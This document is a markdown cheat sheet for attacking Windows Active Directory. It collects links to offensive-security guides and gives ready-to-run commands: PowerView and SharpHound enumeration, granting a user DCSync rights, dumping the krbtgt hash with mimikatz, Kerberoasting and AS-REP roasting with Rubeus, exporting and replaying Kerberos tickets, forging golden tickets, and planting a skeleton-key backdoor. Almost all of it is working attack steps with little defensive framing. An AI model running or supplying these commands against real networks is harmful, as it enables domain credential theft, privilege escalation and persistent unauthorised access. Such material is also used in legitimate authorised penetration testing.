# Resources

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview  

https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/

https://www.varonis.com/blog/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/

### [PowerView.ps1]

https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```
get-aduser <username>
Get-NetDomain
```

### [Sharphound to extract active directory objects]
https://github.com/BloodHoundAD/SharpHound

```
Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName file.zip
```

### [Dumping credentials from the domain controller with DCSync]

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync


1. Import the module
```
import-module .\PowerView.ps1
```

2. Add DCSync rights to user
```
Add-ObjectACL PrincipalIdentity user -Rights DCSync
```

3. Import Active Directory
```
Import-Module ActiveDirectory
```

4. Retrieve the permissions for user
```
(Get-Acl "ad:\dc=DOMAIN,dc=COM").Access | ? {$_.IdentityReference -match 'user' -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }
```

5. Use mimikatz to dump credentials
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md

```
lsadump::dcsync /user:krbtgt
```

Kerberoast
```
Rubeus.exe kerberoast
Rubeus.exe asreproast

dumps tickets containing the hashes hashes for all accounts:

mimikatz.exe

privilege::debug

sekurlsa::tickets /export

Impersonate their tickets

kerberos::ptt <ticket>

This will the hash and security identifier needed to create a golden ticket.

lsadump::lsa /inject /name:username

Generating the golden/silver ticket:

Kerberos::golden /user:<username> /domain:controller.local /sid:<SID> /krbtgt:<NTLM> /id:<ID>

Create a backdoor

misc::cmd
misc::skeleton
```
